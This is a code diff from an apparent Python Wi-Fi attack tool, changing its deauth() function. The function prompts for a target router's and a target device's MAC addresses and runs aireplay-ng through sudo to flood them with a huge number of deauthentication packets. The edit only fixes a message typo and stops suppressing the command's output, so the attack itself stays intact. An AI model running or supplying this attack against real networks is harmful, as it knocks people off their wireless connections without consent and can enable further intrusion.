@@ -402,8 +402,8 @@ def deauth():
     routmac = input(" [Required] --> Please enter the Mac address of the target's access point(router): ")
     climac = input(" [Required] --> Please enter the Mac address of the target's device: ")
     #packno = input(" [Required] --> Please enter the number of the deauthentication packets to be sent to the target: ")
-    print("\n [Info] --> the attack is in action, if you want to stop the attack please on the left \"ctrl+c\" buttons ")
-    subprocess.call(['sudo', 'aireplay-ng', '--deauth', '100000000000000' ,'-a', routmac ,'-c', climac , Intff], stdout=subprocess.DEVNULL)
+    print("\n [Info] --> the attack is in action, if you want to stop the attack please press on the left \"ctrl+c\" buttons ")
+    subprocess.call(['sudo', 'aireplay-ng', '--deauth', '100000000000000' ,'-a', routmac ,'-c', climac , Intff])
 def lines():
     print("-------------------------------------------------------------------------------------------------------")
 def TheEnd():
